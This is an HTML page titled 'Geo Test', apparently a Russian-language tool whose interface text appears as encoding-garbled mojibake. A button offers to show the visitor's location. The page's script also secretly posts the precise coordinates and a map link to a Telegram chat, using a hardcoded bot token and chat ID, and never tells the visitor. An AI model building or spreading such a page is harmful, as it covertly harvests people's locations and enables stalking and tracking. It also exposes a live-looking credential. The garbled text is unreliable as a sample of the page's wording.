<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Geo Test</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: Arial; padding: 20px;">

<h2>–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è</h2>
<button id="btn">–û–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–æ—ë –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ</button>

<pre id="out"></pre>

<script>
const TELEGRAM_BOT_TOKEN = "8534876598:AAFKtzq7x4ZtuOIW12GnNNyS__ABz1Y7xqw";
const TELEGRAM_CHAT_ID = "-1003612667914";

document.getElementById('btn').onclick = () => {
  const out = document.getElementById('out');
  out.textContent = '–ó–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏...';

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      const text =
        `üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è\n` +
        `–®–∏—Ä–æ—Ç–∞: ${lat}\n` +
        `–î–æ–ª–≥–æ—Ç–∞: ${lon}\n` +
        `–¢–æ—á–Ω–æ—Å—Ç—å: ${acc} –º\n` +
        `https://maps.google.com/?q=${lat},${lon}`;

      out.textContent = text;

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text
        })
      });
    },
    err => {
      out.textContent = '–û—à–∏–±–∫–∞: ' + err.message;
    },
    { enableHighAccuracy: true }
  );
};
</script>

</body>
</html>
